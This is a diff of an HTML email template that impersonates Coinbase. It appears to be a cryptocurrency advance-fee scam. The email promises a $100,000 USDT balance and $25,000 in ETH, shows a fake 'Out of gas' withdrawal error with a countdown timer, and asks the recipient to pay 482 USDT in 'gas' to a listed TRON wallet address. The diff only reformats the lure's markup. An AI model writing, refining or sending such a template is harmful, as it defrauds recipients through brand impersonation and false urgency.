@@ -11,9 +11,7 @@
    <td align="center"> </td>
         <table role="presentation" cellpadding="0" cellspacing="0" width="600" class="container" style="width:600px; background-color:#ffffff; border-radius:8px; overflow:hidden;">
   
-          
-
-                       <!-- Header -->
+            <!-- Header -->
  
   <td align="center" style="padding: 20px;">
 <img src="IMG_0523.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
@@ -55,7 +53,7 @@
 
  <hr>
            
-                                                         <!-- XtN Details -->
+                                                  <!-- XtN Details -->
                                                          
 <img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="100" />
 
@@ -68,7 +66,6 @@
 <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
 
 <br>
-<div>
   
 <b>Gas(estimated):[$482]=482 USDT</b>
 
@@ -76,35 +73,22 @@
 </div>
 <br>
 
-<span style="color: Blue;"> ~~$0.00 USDT PAID~~ </span>
+<span style="color: Blue;"> ~~$0.00 USDT PAID~~ </span> <br>
 
 <span style="color: green;">RECEVING IN <<<15 seconds</span>
 
-<br>
-
-
-  <td align="center" style="padding: 20px;">
-    
-<img src="IMG_0523.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
-    
-   </td>
-
-
-<div>
+<hr>
 
 | TOP USDT GAS⛽️    | TEUh5LumZf8UDhGhZNbSmSKwQ6945cvx7o|
 |---------------------------|---------------------------|
 | USDT  network         | ⛽️ Gas Refill ID ⬆️       |
-  
 
 
 <img align="center" src="IMG_0565.jpeg" alt="blockchain Logo" width="38" />
 
-</div>
-
 <hr>
 
-<span style="color: Blue;"> ***ERROR!!!*** </span> 
+<span style="color: Blue;"><strong>ERROR!!!</strong> 
 
 <span style="color: Red;">Warning! Error encountered during Withdraw execution ~~[Out of gas]~~ ⚠️</span>
 
@@ -114,19 +98,15 @@
 
 <img align="center" src="IMG_0567.jpeg" alt="payslip" width="500" />
 
-<span style="color: red;"> **SUMMARY~** <You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price> </span>  <img src="IMG_9118.jpeg" alt="blockchain Logo" width="15" />
+<span style="color: red;"> <strong>SUMMARY</strong>You need 482  USDT to complete this transaction Buy more [$482] USDT For Gas Price!</span>  <img src="IMG_9118.jpeg" alt="blockchain Logo" width="15" />
 
 
 <img align="center" src="IMG_9113.jpeg" alt="ethscan Logo" width="500" />
-
-<div>
-
+<br>
 <form action="https://etherscan.io/" method="get">
 <button align="center" type="submit"> Accept incoming ETH [$25,000] </button>
 </form>
-
-</div>
-
+<hr>
 <img align="center" src="IMG_9086.gif" alt="loading gif display" width="500">
 
 
